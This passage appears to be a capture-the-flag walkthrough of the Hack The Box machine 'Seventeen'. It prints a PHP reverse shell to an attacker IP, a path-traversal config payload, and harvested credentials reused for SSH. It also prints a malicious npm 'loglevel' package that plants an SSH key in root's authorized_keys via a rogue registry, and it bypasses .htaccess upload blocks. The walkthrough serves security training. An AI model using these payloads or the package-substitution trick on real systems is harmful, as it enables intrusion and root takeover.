 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      376c http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/papers => http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/papers/
[####################] - 1m     59998/59998   0s      found:1       errors:1      
[####################] - 58s    29999/29999   511/s   http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/ 
[####################] - 56s    29999/29999   532/s   http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/papers

```

#### Shell

Putting that all together, I’ll first upload a simple PHP reverse shell as `papers.php`:

```

<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"); ?>

```

This will put it at `[somepath]/oldmanagement/files/31234/papers.php`. I can take a guess that `[somepath]` is either `/var/www` or maybe `/var/www/html` (it’s the latter). So a payload like this works:

```

_plugins_qwerty=../../../../../../../../../var/www/html/oldmanagement/files/31234/papers&_step=2&_product_name=Seventeen+Webmail&submit=UPDATE+CONFIG

```

On sending, it reports that it saved the config:

[![image-20220504155844870](https://0xdfimages.gitlab.io/img/image-20220504155844870.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220504155844870.png)

Now on loading any Roundcube page, it generates a reverse shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.82 50750
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@1a447de8638b:/var/www/html/mastermailer$

```

I’ll do a [shell upgrade](https://youtu.be/DqE6DxqJg8Q):

```

www-data@1a447de8638b:/var/www/html/mastermailer$ script /dev/null -c bash
Script started, file is /dev/null
www-data@1a447de8638b:/var/www/html/mastermailer$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@1a447de8638b:/var/www/html/mastermailer$

```

## Shell as mark [seventeen]

### Enumeration

#### Docker

It’s clear that I’m in a Docker container. The hostname is `1a447de8638b` and not something related to the box name. There’s a `.dockerenv` file in `/`:

```

www-data@3c0f9fd0f60d:/$ ls -la .dockerenv 
-rwxr-xr-x 1 root root 0 Apr  8 18:55 .dockerenv

```

Very few commands are on the host. No `ifconfig` , `ip`, etc.

#### Users

There are no directories in `/home`. Interestingly, there is one user with a shell:

```

www-data@3c0f9fd0f60d:/$ cat /etc/passwd | grep -v -e nologin -e false
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
mark:x:1000:1000:,,,:/var/www/html:/bin/bash

```

#### Creds

Hunting for creds, there are three websites in `/var/www/html`:

```

www-data@3c0f9fd0f60d:/var/www/html$ ls
employeemanagementsystem  mastermailer  oldmanagement

```

Starting with `ems`, there’s a bunch of PHP scripts:

```

www-data@3c0f9fd0f60d:/var/www/html/employeemanagementsystem$ ls
aboutus.html    alogin.html     approve.php  assignproject.php  contact.html  delete.php   eloginwel.php   hero-banner.png  mark.php         process      reset.php      styleapply.css     stylelogin.css    vendor
addemp.php      aloginwel.php   assets       cancel.php         css           edit.php     empleave.php    index.html       myprofile.php    psubmit.php  salaryemp.php  styleemplogin.css  styleprofile.css  viewemp.php
adminstyle.css  applyleave.php  assign.php   changepassemp.php  db            elogin.html  empproject.php  js               myprofileup.php  readme.txt   style.css      styleindex.css     styleview.css

```

To find how it’s connecting to the DB, I’ll look at the top of one of the files. For example, `edit.php`:

```

<?php

require_once ('process/dbh.php');
$sql = "SELECT * FROM `employee` WHERE 1";

//echo "$sql";
$result = mysqli_query($conn, $sql);
if(isset($_POST['update']))
{
...[snip]...

```

That suggests the connection is likely in `process/dbh.php`, and it is:

```

<?php

$servername = "localhost";
$dBUsername = "root";
$dbPassword = "2020bestyearofmylife";
$dBName = "ems";

$conn = mysqli_connect($servername, $dBUsername, $dbPassword, $dBName);

if(!$conn){
        echo "Databese Connection Failed";
}

?>

```

I’ll note “2020bestyearofmylife”.

In `mastermailer/config/config.inc.php` I’ll find this connection string:

```

$config['db_dsnw'] = 'mysql://mysqluser:mysqlpassword@172.18.0.1/roundcubedb';

```

“mysqlpassword” is another password.

In `oldmanagement/admin/conn.php` there’s another connection, using the same creds:

```

<?php
        $conn = mysqli_connect("172.18.0.1", "mysqluser", "mysqlpassword", "db_sfms");

        if(!$conn){
                die("Error: Failed to connect to database!");
        }

        $default_query = mysqli_query($conn, "SELECT * FROM `user`") or die(mysqli_error());
        $check_default = mysqli_num_rows($default_query);

        if($check_default === 0){
                $enrypted_password = md5('admin');
                mysqli_query($conn, "INSERT INTO `user` VALUES('', 'Administrator', '', 'admin', '$enrypted_password', 'administrator')") or die(mysqli_error());
                return false;
        }
?>

```

### SSH

It turns out that the creds from the `ems` DB also work as mark’s password over SSH into the host:

```

oxdf@hacky$ sshpass -p '2020bestyearofmylife' ssh mark@seventeen.htb
...[snip]...
mark@seventeen:~$

```

And read `user.txt`:

```

mark@seventeen:~$ cat user.txt
c83fff05************************

```

## Shell as kavi

### Enumeration

#### mark’s Home Dir

There’s not much in mark’s home dir:

```

mark@seventeen:~$ ls -la
total 36
drwxr-x---  5 mark mark 4096 May 11 11:54 .
drwxr-xr-x  4 root root 4096 Apr  8 19:06 ..
lrwxrwxrwx  1 mark mark    9 Apr 10 03:17 .bash_history -> /dev/null
-rw-r--r--  1 mark mark  220 Apr  8 19:06 .bash_logout
-rw-r--r--  1 mark mark 3771 Apr  8 19:06 .bashrc
drwx------  2 mark mark 4096 Apr  8 19:26 .cache
drwx------  3 mark mark 4096 Apr  8 19:26 .gnupg
drwxrwxr-x 16 mark mark 4096 Apr  8 19:35 .npm
-rw-r--r--  1 mark mark  807 Apr  8 19:06 .profile
-rw-r-----  1 root mark   33 Apr 10 18:00 user.txt

```

I will note a `.npm` directory. NPM is the Node Package Manager. There’s a handful of modules installed, as well as a `127.0.0.1_4873` directory:

```

mark@seventeen:~$ ls .npm/
127.0.0.1_4873  db-logger  _locks                readable-stream  string_decoder
bignumber.js    inherits   mysql                 safe-buffer      util-deprecate
core-util-is    isarray    process-nextick-args  sqlstring

```

#### kavi’s Home Dir / Mail

There’s a second home directory on the box, kavi, that mark can’t access:

```

mark@seventeen:/home$ ls
kavi  mark
mark@seventeen:/home$ cd kavi/
-bash: cd: kavi/: Permission denied

```

There is mail for kavi in `/var/mail`:

```

To: kavi@seventeen.htb
From: admin@seventeen.htb
Subject: New staff manager application

Hello Kavishka,

Sorry I couldn't reach you sooner. Good job with the design. I loved it. 

I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.

I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application. 

Cheers,
Mike

```

There’s mention of a new project, a private registry (with some issues), and an old logger being replaced with `loglevel` (a publicly available JavaScript [logging app](https://www.npmjs.com/package/loglevel)).

#### Verdaccio

Looking at listening ports, there’s a bunch of stuff listening on localhost only:

```

mark@seventeen:/var/mail$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:6000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6002          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6003          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6004          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6005          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6006          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6007          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6008          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6009          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6011          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6012          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6013          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6014          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6015          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:993           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:995           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:4873          0.0.0.0:*               LISTEN      -
tcp        0      0 172.18.0.1:3306         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:35533         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:110           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:143           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      - 

```

It’s interesting that port 8000 isn’t listed. This has to do with how HTB has different players routing into different Dockers to limit the pain to other players when the RoundCube exploit takes down the instance on shared labs. Port 6000-6015 are those dockers.

With some research, I can group the rest of these ports into:
- Mail server for Roundcube - 110, 143, 993, 995
- MySQL for various webservers - 3306
- DNS - 53
- Website forwards to Docker - 8081 (exams), 8082 (oldmanager)
- Unknown - 4873, but referenced in the `.npm` folder above.

Doing a `curl` on 4873 returns a short page:

```

    <!DOCTYPE html>
      <html lang="en-us"> 
      <head>
        <meta charset="utf-8">
        <base href="http://localhost:4873/">
        <title>Verdaccio</title>        
        <link rel="icon" href="http://localhost:4873/-/static/favicon.ico"/>
        <meta name="viewport" content="width=device-width, initial-scale=1" /> 
        <script>
            window.__VERDACCIO_BASENAME_UI_OPTIONS={"darkMode":false,"basename":"/","base":"http://localhost:4873/","primaryColor":"#4b5e40","version":"5.6.0","pkgManagers":["yarn","pnpm","npm"],"login":true,"logo":"","title":"Verdaccio","scope":"","language":"es-US"}
        </script>
        
      </head>    
      <body class="body">
      
        <div id="root"></div>
        <script defer="defer" src="http://localhost:4873/-/static/runtime.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/vendors.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/main.06493eae2f534100706f.js"></script>
        
      </body>
    </html>

```

The body is loaded by JavaScript, but I do see “Verdaccio”. [Verdaccio](https://verdaccio.org/) is a private JavaScript repo.

If I add an SSH tunnel to provide access to 4873 from my host, I can load it in Firefox:

![image-20220504213423400](https://0xdfimages.gitlab.io/img/image-20220504213423400.png)

### Old Logger

#### Identify

The email mentioned the “old logger”, and talk about using “our registry”. I’ll try to search for what logging modules are in the local registry:

```

mark@seventeen:/var/mail$ npm search log --registry http://127.0.0.1:4873
NAME      DESCRIPTION                                                  AUTHOR     DATE       VERSION KEYWORDS                  
db-logger Log data to a database                                       =kavigihan 2022-03-15 1.0.1   log                       
loglevel  Minimal lightweight logging for JavaScript, adding reliable… =pimterry  2022-04-10 1.8.0   log logger logging browser

```

`db-logger` must be the old one, and it’s written by kavigihan (kavi).

#### Pull

To get a copy of the old logger, I’ll simply run `npm install` and point it at the local repo:

```

mark@seventeen:/dev/shm$ npm install db-logger --registry http://127.0.0.1:4873
/dev/shm
└─┬ db-logger@1.0.1 
  └─┬ mysql@2.18.1 
    ├── bignumber.js@9.0.0 
    ├─┬ readable-stream@2.3.7 
    │ ├── core-util-is@1.0.3 
    │ ├── inherits@2.0.4 
    │ ├── isarray@1.0.0 
    │ ├── process-nextick-args@2.0.1 
    │ ├── string_decoder@1.1.1 
    │ └── util-deprecate@1.0.2 
    ├── safe-buffer@5.1.2 
    └── sqlstring@2.3.1 

npm WARN enoent ENOENT: no such file or directory, open '/dev/shm/package.json'
npm WARN shm No description
npm WARN shm No repository field.
npm WARN shm No README data
npm WARN shm No license field.

```

This downloads it to the current directory, creating a `node_modules` directory. In there, I see a bunch of modules, including `db-logger`:

```

mark@seventeen:/dev/shm$ ls node_modules/
bignumber.js  db-logger  isarray  process-nextick-args  safe-buffer  string_decoder
core-util-is  inherits   mysql    readable-stream       sqlstring    util-deprecate

```

#### Analysis

The module is made up of a single JavaScript file and a `package.json`:

```

mark@seventeen:/dev/shm/node_modules/db-logger$ ls
logger.js  package.json

```

The `package.json` file describes the module:

```

{
  "_args": [
    [
      "db-logger",
      "/dev/shm"
    ]
  ],
  "_from": "db-logger@latest",
  "_id": "db-logger@1.0.1",
  "_inCache": true,
  ...[snip]...
  "author": {
    "name": "kavigihan"
  },
  "contributors": [],
  "dependencies": {
    "mysql": "2.18.1"
  },
  "description": "Log data to a database",
  ...[snip]...

```

The author is kavigihan.

The JavaScript has hard-coded credentials:

```

var mysql = require('mysql');

var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "IhateMathematics123#",
  database: "logger"
});

function log(msg) {
    con.connect(function(err) {
        if (err) throw err;
        var date = Date();
        var sql = `INSERT INTO logs (time, msg) VALUES (${date}, ${msg});`;
        con.query(sql, function (err, result) {
        if (err) throw err;
        console.log("[+] Logged");
        });
    });
};

module.exports.log = log

```

### su / SSH

That password is actually kavi’s password. It works for `su`:

```

mark@seventeen:~$ su kavi
Password: 
kavi@seventeen:/home/mark$

```

And SSH:

```

oxdf@hacky$ sshpass -p 'IhateMathematics123#' ssh kavi@seventeen.htb 
...[snip]...
kavi@seventeen:~$

```

## Shell as Root

### Enumeration

#### Home Dir

kavi has no non-hidden files in their home dir:

```

kavi@seventeen:~$ ls -la
total 44
drwxr-x---   7 kavi kavi 4096 May 11 11:51 .
drwxr-xr-x   4 root root 4096 Apr  8 19:06 ..
lrwxrwxrwx   1 kavi kavi    9 Apr 10 03:17 .bash_history -> /dev/null
-rw-r--r--   1 kavi kavi  220 Apr  4  2018 .bash_logout
-rw-r--r--   1 kavi kavi 3771 Apr  4  2018 .bashrc
drwx------   2 kavi kavi 4096 Feb 19 12:27 .cache
drwxrwxr-x   3 kavi kavi 4096 Feb 26 19:28 .composer
drwx------   3 kavi kavi 4096 Feb 19 12:27 .gnupg
drwxrwxr-x   3 kavi kavi 4096 Feb 19 18:23 .local
drwxrwxr-x 148 kavi kavi 4096 Apr 10 03:23 .npm
-rw-------   1 kavi kavi   32 May 11 15:04 .npmrc
-rw-r--r--   1 kavi kavi  807 Apr  4  2018 .profile

```

There’s a `.npmrc` file, which configures how `npm` runs, setting the default registry to the local one:

```

kavi@seventeen:~$ cat .npmrc 
registry=http://10.10.14.27:4873/

```

#### /opt/app

kavi can also access `/opt/app` (which mark can’t):

```

kavi@seventeen:/opt/app$ ls
index.html  index.js  node_modules  startup.sh

```

This is the new application that mike was talking about in the email. There’s not much there yet. `index.html` is just a “This page is under construction” message. `index.js` is a basic Node webserver serving that page:

```

const http = require('http')
const port = 8000
const fs = require('fs')
//var logger = require('db-logger')
var logger = require('loglevel')

const server = http.createServer(function(req, res) {
    res.writeHead(200, {'Content-Type': 'text/html'})
    fs.readFile('index.html', function(error, data){
        if (error) {
            res.writeHead(404)
            res.write('Error: File Not Found')
            logger.debug(`INFO: Reuqest from ${req.connection.remoteAddress} to /`)

        } else {
            res.write(data)
        }
    res.end()
    })
})

server.listen(port, function(error) {
    if (error) {
        logger.warn(`ERROR: Error occured while starting the server : ${e}`)
    } else {
        logger.log("INFO:  Server running on port " + port)
    }
})

```

It is clear that the `db-logger` has been commented out, and replaced by `loglevel`.

There’s also a `startup.sh`, which loops over each of two dependencies, checking that each are installed, and if not, installing them. Then it starts the Node application:

```

#!/bin/bash

cd /opt/app

deps=('db-logger' 'loglevel')

for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
    o=$(/usr/bin/npm -l ls|/bin/grep $dep)

    if [[ "$o" != *"$dep"* ]]; then
        /bin/echo "[+] Installing $dep"
        /usr/bin/npm install $dep
    else
        /bin/echo "[+] $dep already installed"

    fi
done

/bin/echo "[+] Starting the app"

/usr/bin/node /opt/app/index.js

```

Interestingly, kavi can run this as root:

```

kavi@seventeen:/opt/app$ sudo -l
[sudo] password for kavi: 
Matching Defaults entries for kavi on seventeen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kavi may run the following commands on seventeen:
    (ALL) /opt/app/startup.sh

```

### Malicious JS Module

#### Strategy

The script above will run as root, so if I can get a malicious version of one of those two packages to load, it’ll execute as root.

My first thought was to try to modify it on the local repo. If I try to log in, it fails (I don’t need `--registry` because of the `.npmrc` file):

```

kavi@seventeen:~$ npm login
Username: kavi
Password: 
Email: (this IS public) kavi@seventeen.htb
npm ERR! Linux 4.15.0-175-generic
npm ERR! argv "/usr/bin/node" "/usr/bin/npm" "login"
npm ERR! node v8.10.0
npm ERR! npm  v3.5.2
npm ERR! code E409

npm ERR! user registration disabled : -/user/org.couchdb.user:kavi/-rev/undefined
npm ERR! 
npm ERR! If you need help, you may report this error at:
npm ERR!     <https://github.com/npm/npm/issues>

npm ERR! Please include the following file with any support request:
npm ERR!     /home/kavi/npm-debug.log

```

Registration is disabled.

I noted above that there’s a `.npmrc` file in `/home/kavi` that sets the repository this user uses. I’ll try to change that to point to my host, and then have an instance of Verdaccio there serving a malicious package.

If you think about this too much, it seems like it clearly won’t work. Why would `startup.sh` running as root read `/home/kavi/.npmrc`? It does work, and I’ll dig into why in [Beyond Root](#sudo--home).

#### Create Node Module

The steps to create a module are outlined [here](https://docs.npmjs.com/creating-node-js-modules). I’ll start with `npm init` on my local box:

```

oxdf@hacky$ npm init
This utility will walk you through creating a package.json file.
It only covers the most common items, and tries to guess sensible defaults.

See `npm help json` for definitive documentation on these fields
and exactly what they do.

Use `npm install <pkg>` afterwards to install a package and
save it as a dependency in the package.json file.

Press ^C at any time to quit.
package name: (module) loglevel
version: (1.0.0) 2.0.0
description: 
entry point: (index.js) 
test command: 
git repository: 
keywords: 
author: 
license: (ISC) 
About to write to /media/sf_CTFs/hackthebox/seventeen-10.10.10.82/module/package.json:

{
  "name": "loglevel",
  "version": "2.0.1",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC"
}

Is this OK? (yes)

```

The only one I can’t take the default on is name, which I’ll name `loglevel`, as I want it to be included and called by the server on Seventeen, and I’ll up the version beyond what is current on the [real module](https://www.npmjs.com/package/loglevel), currently 1.8.0. The above process creates a `package.json` file in the current directory.

I used the default of `index.js`, so I’ll create that file right next to `package.json`:

```

const cp = require("child_process")

cp.exec("mkdir -p /root/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' > /root/.ssh/authorized_keys");

function log(msg) {
    console.log(msg);
}

function debug(msg) {
    console.log(msg);
}

function warn(msg) {
    console.log(msg);
}

module.exports.log = log;

```

I don’t believe I need more than a one liner to do my malicious stuff, but I’ll implement the `log` functions that are expected in the node application.

#### Verdaccio Container

To get a server running on my host, I’ll use a [Verdaccio Docker container](https://verdaccio.org/docs/docker/). I’ll run `docker pull verdaccio/verdaccio` (either as root, with `sudo`, or with my user in the `docker` group) to get a copy of the container image.

I’ll run the container using the command from the instructions above, though some experimentation shows that I need to run it with the environment variable `VERDACCIO_PUBLIC_URL` pointing to my tun0 IP:

```

oxdf@hacky$ sudo docker run -it --rm --name verdaccio -p 4873:4873 -e 'VERDACCIO_PUBLIC_URL=http://10.10.14.6' verdaccio/verdaccio
 warn --- config file  - /verdaccio/conf/config.yaml
 warn --- Plugin successfully loaded: verdaccio-htpasswd
 warn --- Plugin successfully loaded: verdaccio-audit
 warn --- http address - http://0.0.0.0:4873/ - verdaccio/5.10.2

```

#### Register Module

Now I’ll submit my module to this new registry. First I need to register:

```

oxdf@hacky$ npm adduser --registry http://10.10.14.6:4873
Username: 0xdf               
Password:                                                            
Email: (this IS public) 0xdf@0xdf.htb
Logged in as 0xdf on http://10.10.14.6:4873/.

```

Now I’ll publish the module:

```

oxdf@hacky$ npm publish --registry http://10.10.14.6:4873
npm notice 
npm notice 📦  loglevel@2.0.1
npm notice === Tarball Contents === 
npm notice 367B index.js    
npm notice 204B package.json
npm notice === Tarball Details === 
npm notice name:          loglevel                                
npm notice version:       2.0.1                                   
npm notice package size:  486 B                                   
npm notice unpacked size: 571 B                                   
npm notice shasum:        ab3dc4ab6663916a6a8a6f6852f3c9e79f4a71b4
npm notice integrity:     sha512-tY/SaAbYf7LE6[...]qLGE2/OjUBlxg==
npm notice total files:   2                                       
npm notice 
+ loglevel@2.0.1

```

#### Exploit

Now I’ll set the `.npmrc` file and the run `startup.sh`:

```

kavi@seventeen:~$ sudo /opt/app/startup.sh 
[sudo] password for kavi: 
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@2.0.1 
└── mysql@2.18.1 

npm WARN enoent ENOENT: no such file or directory, open '/opt/app/package.json'
npm WARN app No description
npm WARN app No repository field.
npm WARN app No README data
npm WARN app No license field.
[+] Starting the app
INFO:  Server running on port 8000

```

It runs and starts the app.

If it loaded my malicious `loglevel`, then I should have a key in root’s `authorized_keys`.

It works:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@seventeen.htb
...[snip]...                               
root@seventeen:~#

```

## Beyond Root

### sudo / $HOME

To get root, I’ll run `sudo /opt/app/startup.sh`, and the script will call `npm` as root, which loads the `.npmrc` file in `/home/kavi`. Why does that work? Why would root load an RC file from kavi’s home directory?

It turns out that it’s important that box is Ubuntu 18.04 and not something later, as explained in [this article](https://askubuntu.com/questions/1186999/how-does-sudo-handle-home-differently-since-19-10):

> For years, Ubuntu has [shipped a patched version of `sudo` that preserves `$HOME` by default](https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/760140). Besides Ubuntu and its derivatives, [very few other operating systems (perhaps no others) do this](https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/1556302/comments/8). It has been [**decided that this causes more problems than it solves**](https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/1556302), and [starting in Ubuntu 19.10](https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/1556302/comments/16), `$HOME` is no longer one of the few environment variables `sudo` preserves.

Before Ubuntu 19.10, Ubuntu patched `sudo` to preserve the `$HOME` environment variable by default, whereas other distros only did that with `-H`.

So even though it’s running as root, the `$HOME` environment variable is set to `/home/kavi`, and that’s where the RC files are loaded from.

### Unintended Webshell Execution

#### Background

I noted above that I could upload a webshell to the OldManagement server, and it would upload, but at that point all I could do is click “Download”, which returns the file. Later, I found the path to the files, but even then, visiting my file returns a 403:

![image-20220922152748652](https://0xdfimages.gitlab.io/img/image-20220922152748652.png)

#### Exploit by Stomping .htaccess

What’s likely blocking this file on an Apache webserver is an `.htaccess` file. This file defines custom rules for how files are handled in the current directory. With root, I can drop into the docker container and look at that file:

```

root@seventeen:~# docker exec -it manager6000 bash
root@8df6395c368f:/var/www/html# cat oldmanagement/files/31234/.htaccess 
php_flag engine off
Options -Indexes
ErrorDocument 403 "<h1>Forbidden</h1>"
RedirectMatch 403 ^/var/www/oldmanagement/files/31234/?$
RedirectMatch 403 ^.*\.php$

```

Anything ending in `.php` will get a 403 Forbidden HTTP response code. and `ErrorDocument`.

Unfortunately for the `.htaccess` file is writable by www-data:

```

root@8df6395c368f:/var/www/html/oldmanagement/files/31234# ls -la
total 688
drwxr-xr-x 3 www-data www-data   4096 Sep 22 19:30 .
drwxr-xr-x 3 www-data www-data   4096 Sep 22 19:30 ..
-rw-r--r-- 1 www-data root        161 May 29 15:48 .htaccess
-rw-r--r-- 1 www-data root     684399 May 10 05:05 Marksheet-finals.pdf
drwxr-xr-x 2 www-data www-data   4096 Sep 22 19:30 papers

```

Since the file is owned and writable by root, I can overwrite it by uploading a new one. I’ll create an empty file:

```

oxdf@hacky$ touch .htaccess

```

I can upload that just like any other file:

![image-20220922153752646](https://0xdfimages.gitlab.io/img/image-20220922153752646.png)

From my root shell, I can see it’s empty:

```

root@8df6395c368f:/var/www/html/oldmanagement/files/31234# cat .htaccess
root@8df6395c368f:/var/www/html/oldmanagement/files/31234# ls -la .htaccess 
-rw-r--r-- 1 www-data www-data 0 Sep 22 19:37 .htaccess

```

Now the webshell works:

![image-20220922153856548](https://0xdfimages.gitlab.io/img/image-20220922153856548.png)

This technique is very similar to the intended path on [Bludner](/2020/10/17/htb-blunder.html#php-upload-exploit). Thanks to IppSec for pointing this one out to me.

#### Avoid .htaccess

Instead of modifying the `.htaccess` file, I’ll avoid it. When I submit the webshell for upload, I’ll intercept that post in Burp:

![image-20220922154056728](https://0xdfimages.gitlab.io/img/image-20220922154056728.png)

One of the fields is the `stud_no`, which matches the number I logged in with. I’ll modify that to 223, and send the request.

This time, the uploaded file doesn’t show up in the files list on the main page. But visiting the path does show the shell, and it executes:

![image-20220922154220933](https://0xdfimages.gitlab.io/img/image-20220922154220933.png)

There is no `.htaccess` file in the `223` directory:

```

root@8df6395c368f:/var/www/html/oldmanagement/files/223# ls -la
total 12
drwxr-xr-x 2 www-data www-data 4096 Sep 22 19:41 .
drwxr-xr-x 4 www-data www-data 4096 Sep 22 19:41 ..
-rw-r--r-- 1 www-data www-data   35 Sep 22 19:41 0xdf.php

```